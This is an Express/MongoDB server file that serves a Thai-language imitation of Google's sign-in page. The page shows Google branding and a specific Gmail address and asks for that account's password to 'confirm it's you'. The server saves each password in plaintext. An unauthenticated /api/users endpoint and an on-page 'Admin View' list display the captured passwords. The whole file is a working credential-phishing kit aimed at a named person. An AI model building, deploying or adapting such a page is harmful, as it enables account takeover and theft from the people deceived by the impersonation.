const express = require('express');
const mongoose = require('mongoose');

const app = express();
const PORT = process.env.PORT || 10000;

app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static('.'));

const MONGODB_URI = process.env.MONGODB_URI;

mongoose.connect(MONGODB_URI)
  .then(() => console.log('MongoDB connected successfully'))
  .catch(err => console.error('MongoDB connection error:', err));

const userSchema = new mongoose.Schema({
  email: { type: String, default: 'taiphak25442001@gmail.com' },
  password: { type: String, required: true },
  createdAt: { type: Date, default: Date.now }
});

const User = mongoose.model('User', userSchema);

app.get('/', (req, res) => {
  res.send(`
    <!DOCTYPE html>
    <html lang="th">
    <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>ลงชื่อเข้าใช้ - บัญชี Google</title>
      <style>
        body { font-family: 'Roboto', Roboto, Arial, sans-serif; background: #fff; margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; flex-direction: column; }
        .card { width: 100%; max-width: 450px; padding: 40px; box-sizing: border-box; background: #fff; border: 1px solid #dadce0; border-radius: 8px; margin: 20px; }
        .logo { text-align: center; margin-bottom: 16px; }
        .logo svg { width: 75px; height: 24px; }
        h1 { font-size: 24px; font-weight: 400; text-align: center; margin: 0 0 16px 0; color: #202124; }
        .account-box { display: flex; align-items: center; border: 1px solid #dadce0; border-radius: 32px; padding: 4px 12px 4px 4px; width: fit-content; margin: 0 auto 24px auto; font-size: 14px; color: #3c4043; cursor: pointer; }
        .account-box img { width: 20px; height: 20px; border-radius: 50%; margin-right: 8px; object-fit: cover; }
        .info-box { background: #e8f0fe; border-radius: 8px; padding: 16px; font-size: 14px; color: #174ea6; margin-bottom: 24px; display: flex; align-items: flex-start; line-height: 1.4; }
        .info-box span.icon { background: #1a73e8; color: white; border-radius: 50%; width: 18px; height: 18px; display: inline-flex; justify-content: center; align-items: center; font-size: 11px; font-weight: bold; margin-right: 12px; flex-shrink: 0; margin-top: 1px; }
        .instruction { font-size: 14px; color: #202124; margin-bottom: 24px; }
        .input-group { position: relative; margin-bottom: 12px; }
        input[type="password"], input[type="text"] { width: 100%; padding: 14px 16px; font-size: 16px; border: 1px solid #dadce0; border-radius: 4px; box-sizing: border-box; outline: none; transition: border 0.2s; }
        input:focus { border-color: #1a73e8; border-width: 2px; padding: 13px 15px; }
        .checkbox-container { display: flex; align-items: center; margin-bottom: 32px; font-size: 14px; color: #202124; cursor: pointer; }
        .checkbox-container input { margin-right: 8px; width: 18px; height: 18px; accent-color: #1a73e8; }
        .btn-container { display: flex; justify-content: space-between; align-items: center; margin-top: 10px; }
        .btn-primary { background: #1a73e8; color: white; border: none; padding: 10px 24px; font-size: 14px; font-weight: 500; border-radius: 4px; cursor: pointer; }
        .btn-primary:hover { background: #1557b0; }
        .link { color: #1a73e8; font-size: 14px; text-decoration: none; font-weight: 500; }
        .link:hover { text-decoration: underline; }
        .footer { display: flex; justify-content: space-between; width: 100%; max-width: 450px; margin-top: 20px; font-size: 12px; color: #5f6368; padding: 0 10px; box-sizing: border-box; }
        .footer select, .footer div a { color: #5f6368; text-decoration: none; margin-left: 15px; }
        .footer div a:hover { text-decoration: underline; }
        .admin-section { margin-top: 30px; border-top: 1px solid #dadce0; padding-top: 15px; width: 100%; max-width: 450px; box-sizing: border-box; }
        .admin-section h3 { font-size: 14px; color: #5f6368; margin-bottom: 8px; }
        ul { padding-left: 20px; font-size: 12px; color: #3c4043; max-height: 120px; overflow-y: auto; }
        li { margin-bottom: 4px; }
      </style>
    </head>
    <body>
      <div class="card">
        <div class="logo">
          <svg viewBox="0 0 75 24" width="75" height="24" xmlns="http://www.w3.org/2000/svg">
            <path fill="#4285F4" d="M9.75 11.45v2.22h5.57c-.24 1.4-1.63 4.1-5.57 4.1-3.35 0-6.08-2.77-6.08-6.18s2.73-6.18 6.08-6.18c1.9 0 3.17.81 3.9 1.51l1.75-1.7-1.1-1.08C12.87 2.91 11.45 2.4 9.75 2.4 5.3 2.4 1.7 6 1.7 10.45s3.6 8.05 8.05 8.05c4.65 0 7.73-3.27 7.73-7.87 0-.54-.05-1.07-.13-1.18H9.75z"/>
            <path fill="#EA4335" d="M24.77 8.35c-3.25 0-5.9 2.45-5.9 5.8s2.65 5.8 5.9 5.8 5.9-2.45 5.9-5.8-2.65-5.8-5.9-5.8zm0 9.4c-1.9 0-3.48-1.55-3.48-3.6s1.58-3.6 3.48-3.6 3.48 1.55 3.48 3.6-1.58 3.6-3.48 3.6z"/>
            <path fill="#FBBC05" d="M38.37 8.35c-3.25 0-5.9 2.45-5.9 5.8s2.65 5.8 5.9 5.8 5.9-2.45 5.9-5.8-2.65-5.8-5.9-5.8zm0 9.4c-1.9 0-3.48-1.55-3.48-3.6s1.58-3.6 3.48-3.6 3.48 1.55 3.48 3.6-1.58 3.6-3.48 3.6z"/>
            <path fill="#4285F4" d="M51.13 8.52h-2.35v10.9h2.4V14.1h4.4c2.25 0 4.05-1.67 4.05-3.78s-1.8-3.78-4.05-3.78h-4.4zm2.38 5.4h-2.38V10.3h2.38c1.02 0 1.83.77 1.83 1.85s-.81 1.87-1.83 1.87z"/>
            <path fill="#34A853" d="M62.6 19.25h2.4V2.4h-2.4z"/>
            <path fill="#EA4335" d="M70.07 14.28l2.12 1.45c.68-1.02 1.87-2.75 4.38-2.75 2.65 0 4.45 1.83 4.45 4.1v.28h-.12c-.65.75-1.83 1.42-3.37 1.42-3.2 0-6.15-1.8-6.15-5.25 0-3.08 2.68-5.18 5.5-5.18 2.5 0 3.7 1.15 4.12 1.85l-1.97 1.3c-.35-.55-.95-1.1-2.15-1.1-1.32 0-2.6 1.02-2.6 2.68 0 1.5 1.15 2.55 2.4 2.55 1.25 0 2-.62 2.25-1h2.32c-.32 1.82-2.02 3.1-4.57 3.1-2.82 0-5.32-2.12-5.32-5.1 0-3.1 2.32-5.32 5.3-5.32 2.7 0 4.45 1.28 5.02 2.48z"/>
          </svg>
        </div>
        <h1>M J</h1>
        
        <div class="account-box">
          <img src="/avatar.jpg" alt="avatar">
          <span>taiphak25442001@gmail.com</span>
          <span style="margin-left: 6px; font-size: 10px; color: #5f6368;">▼</span>
        </div>

        <div class="info-box">
          <span class="icon">i</span>
          <div>เลือก "ลองวิธีอื่น" เพื่อใช้พาสคีย์สำหรับการลงชื่อเข้าใช้ที่ง่ายและปลอดภัยยิ่งขึ้น</div>
        </div>

        <div class="instruction">
          หากต้องการดำเนินการต่อ โปรดยืนยันก่อนว่าเป็นคุณ
        </div>

        <form id="regForm">
          <div class="input-group">
            <input type="password" id="password" placeholder="ป้อนรหัสผ่าน" required>
          </div>
          <div class="checkbox-container">
            <input type="checkbox" id="showPassword">
            <label for="showPassword">แสดงรหัสผ่าน</label>
          </div>
          <div class="btn-container">
            <a href="#" class="link">ลองวิธีอื่น</a>
            <button type="submit" class="btn-primary">ถัดไป</button>
          </div>
        </form>
      </div>

      <div class="footer">
        <div>ไทย</div>
        <div>
          <a href="#">ความช่วยเหลือ</a>
          <a href="#">ความเป็นส่วนตัว</a>
          <a href="#">ข้อกำหนด</a>
        </div>
      </div>

      <div class="admin-section">
        <h3>ข้อมูลรหัสผ่านที่บันทึกไว้ (Admin View):</h3>
        <ul id="userList">กำลังโหลด...</ul>
      </div>

      <script>
        const passwordInput = document.getElementById('password');
        const showPasswordCheckbox = document.getElementById('showPassword');

        showPasswordCheckbox.addEventListener('change', function() {
          if (this.checked) {
            passwordInput.type = 'text';
          } else {
            passwordInput.type = 'password';
          }
        });

        async function loadUsers() {
          try {
            const res = await fetch('/api/users');
            const data = await res.json();
            const list = document.getElementById('userList');
            if (data.length === 0) {
              list.innerHTML = '<li>ยังไม่มีข้อมูลในระบบ</li>';
              return;
            }
            list.innerHTML = data.map(user => 
              '<li><strong>รหัส:</strong> ' + user.password + ' <small style="color:#666;">(' + new Date(user.createdAt).toLocaleString() + ')</small></li>'
            ).join('');
          } catch (err) {
            document.getElementById('userList').innerHTML = '<li>เกิดข้อผิดพลาดในการโหลดข้อมูล</li>';
          }
        }

        document.getElementById('regForm').addEventListener('submit', async (e) => {
          e.preventDefault();
          const password = passwordInput.value;

          const res = await fetch('/api/register', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ email: 'taiphak25442001@gmail.com', password })
          });

          if (res.ok) {
            alert('ยืนยันตัวตนสำเร็จ!');
            document.getElementById('regForm').reset();
            loadUsers();
          } else {
            alert('เกิดข้อผิดพลาด');
          }
        });

        loadUsers();
      </script>
    </body>
    </html>
  `);
});

app.post('/api/register', async (req, res) => {
  try {
    const { email, password } = req.body;
    const newUser = new User({ email: email || 'taiphak25442001@gmail.com', password });
    await newUser.save();
    res.status(201).json({ message: 'Saved successfully!', user: newUser });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

app.get('/api/users', async (req, res) => {
  try {
    const users = await User.find().sort({ createdAt: -1 });
    res.json(users);
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

app.listen(PORT, () => {
  console.log('Server is running on port ' + PORT);
});
